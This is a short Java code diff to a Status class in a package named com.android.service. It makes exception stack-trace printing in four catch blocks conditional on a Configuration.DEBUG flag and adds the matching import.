@@ -17,6 +17,7 @@ import com.android.service.action.Action;
 import com.android.service.agent.AgentConf;
 import com.android.service.agent.AgentType;
 import com.android.service.agent.AgentCrisis;
+import com.android.service.conf.Configuration;
 import com.android.service.conf.Option;
 import com.android.service.event.EventConf;
 import com.android.service.interfaces.Observer;
@@ -377,7 +378,7 @@ public class Status {
 			try {
 				triggeredSemaphore.notifyAll();
 			} catch (Exception ex) {
-				ex.printStackTrace();
+				if(Configuration.DEBUG) { ex.printStackTrace(); }
 			}
 		}
 	}
@@ -424,7 +425,7 @@ public class Status {
 			try {
 				triggeredSemaphore.notifyAll();
 			} catch (Exception ex) {
-				ex.printStackTrace();
+				if(Configuration.DEBUG) { ex.printStackTrace(); }
 			}
 		}
 	}
@@ -440,7 +441,7 @@ public class Status {
 			try {
 				triggeredSemaphore.notifyAll();
 			} catch (Exception ex) {
-				ex.printStackTrace();
+				if(Configuration.DEBUG) { ex.printStackTrace(); }
 			}
 		}
 	}
@@ -461,7 +462,7 @@ public class Status {
 			}
 		} catch (GeneralException e) {
 			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if(Configuration.DEBUG) { e.printStackTrace(); }
 		}
 
 	}
